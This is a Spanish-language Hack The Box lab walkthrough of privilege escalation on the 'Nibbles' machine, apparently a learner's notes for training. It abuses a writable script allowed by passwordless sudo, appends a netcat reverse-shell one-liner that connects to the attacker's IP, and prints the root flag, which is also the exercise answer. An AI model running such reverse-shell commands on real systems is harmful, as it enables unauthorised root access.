Ahora que tenemos una conexión shell inversa, es hora de aumentar los privilegios. Podemos descomprimir el archivo `personal.zip` y ver un archivo llamado `monitor.sh`.

~~~
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
~~~

El shell script `monitor.sh` es un script de monitoreo, y es propiedad de nuestro usuario `nibbler` y se puede escribir.

~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh

cat monitor.sh
                 ####################################################################################################

                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

                 ####################################################################################################

#! /bin/bash

# unset any variable which system may be using

# clear the screen

clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
       case $name in
         i)iopt=1;;
         v)vopt=1;;
         *)echo "Invalid arg";;
       esac
done

 <SNIP>
 ~~~

 Dejemos esto a un lado por ahora y extraigamos [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) para realizar algunas comprobaciones automáticas de escalada de privilegios. Primero, descargue el script a su VM de ataque local o Pwnbox y luego inicie un servidor HTTP de `Python` usando el comando `sudo python3 -m http.server 8080`.

 ~~~
 Juceco@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
~~~

De vuelta en el tipo de destino `wget http://<your ip>:8080/LinEnum.sh` para descargar el script. Si tiene éxito, veremos una respuesta de `200 success` en nuestro servidor HTTP de Python. Una vez que se extrae la secuencia de comandos, escriba `chmod +x LinEnum.sh` para hacer que la secuencia de comandos sea ejecutable y luego escriba `./LinEnum.sh` para ejecutarlo. Vemos un montón de resultados interesantes, pero lo que inmediatamente llama la atención son los privilegios de `sudo`.

~~~
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
~~~

El usuario de `nibbler` puede ejecutar el archivo `/home/nibbler/personal/stuff/monitor.sh` con privilegios de root. Dado que tenemos control total sobre ese archivo, si agregamos un reverse shell de una sola línea al final y ejecutamos con `sudo`, deberíamos obtener un shell inverso como usuario raíz. Editemos el archivo `monitor.sh` para agregar una sola línea de reverse shell.

~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
~~~

Si buscamos el archivo `monitor.sh`, veremos el contenido anexado al final. `Es crucial si alguna vez nos encontramos con una situación en la que podamos aprovechar un archivo editable para escalar privilegios. Solo agregamos al final del archivo (después de hacer una copia de seguridad del archivo) para evitar sobrescribirlo y causar una interrupción`. Ejecute el script con `sudo`:

~~~
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
~~~

Finalmente, captura el root shell en nuestro oyente `nc` en espera.

~~~
Juceco@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id

uid=0(root) gid=0(root) groups=0(root)
~~~

Desde aquí, podemos agarrar el indicador `root.txt`. Finalmente, ahora hemos resuelto nuestra primera maquina sobre HTB. Trate de replicar todos los pasos por su cuenta. Pruebe varias herramientas para lograr el mismo efecto. Podemos utilizar muchas herramientas diferentes para los distintos pasos necesarios para resolver esta maquina. Este tutorial muestra un método posible. Asegúrate de tomar notas detalladas para practicar ese conjunto de habilidades vitales.
___

### RETO

+ Aumente los privilegios y envíe la bandera que esta en root.txt.

`R: de5e5d6619862a8aa5b9b212314e0cdd`

Partiendo del ejercicio anterior
~~~
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.166.85] 47578
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

revisamos la otra informacion que tenemos en el directorio nibbler
~~~
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
<ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler            
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
~~~

Descomprimimos el archivo y nos muestra el directorio personal y dentro de este el directorio stuff, donde esta un archivo en bash
~~~
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal
cd personal
nibbler@Nibbles:/home/nibbler/personal$ ls
ls
stuff
nibbler@Nibbles:/home/nibbler/personal$ cd stuff
cd stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
ls
monitor.sh
~~~

Vemos la informacion que esta en el archivo con cat y podemos inyectar codigo en este archivo para que se ejecute una reverse shell
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
~~~

Activamos el servidor de python con el siguiente codigo `python3 -m http.server 8080` en otra ventana de terminal recordemos que hay que tener el archivo que queremos cargar en la maquina que estamos atacando en el directorio donde activamos el servidor de python por ejemplo en este caso `LinEnum.sh` debe estar en `/home/kali`
~~~
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.166.85 - - [20/Jul/2022 21:16:36] "GET /LinEnum.sh HTTP/1.1" 200 -
~~~

Cargamos el archivo con wget http://Nuestra-IP:8080/LinEnum.sh
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.14.93:8080/LinEnum.sh                                                                             
<er/personal/stuff$ wget http://10.10.14.93:8080/LinEnum.sh                      
--2022-07-20 17:16:34--  http://10.10.14.93:8080/LinEnum.sh
Connecting to 10.10.14.93:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K  56.9KB/s    in 0.8s    

2022-07-20 17:16:36 (56.9 KB/s) - 'LinEnum.sh' saved [46631/46631]
~~~

~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
ls
LinEnum.sh  monitor.sh
~~~

Hay que cambiar los permisos de LinEnum.sh, 
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
~~~

Ejecutamos el archivo, cortaremos la informacion que arroja esta herramienta ya que es bastante extensa
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Jul 20 17:17:20 EDT 2022                                                     
                                                                                 

### SYSTEM ##############################################
[-] Kernel information:
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-104-generic (buildd@lgw01-amd64-022) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) ) #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017

...SNIP...

### SCAN COMPLETE ####################################
~~~

Recordemos que con echo se puede insertar una linea de codigo en un archivo, en este caso en monitor.sh para hacerlo una reverse shell
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 8443 >/tmp/f' | tee -a monitor.sh
< /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 8443 >/tmp/f' | tee -a monitor.sh    
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 8443 >/tmp/f
~~~

Antes de ejecutar monitor.sh debemos poner a la escucha nuestra maquina en el puerto 8443, esto lo hacemos en otra ventana de la terminal
~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
~~~

Despues de correr el archivo tenemos nuestra reverse shell y podremos tener acceso como root
~~~
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 8443           
listening on [any] 8443 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.166.85] 35962
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Nibbles:/home/nibbler/personal/stuff# cd
cd
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd
root@Nibbles:~#
~~~
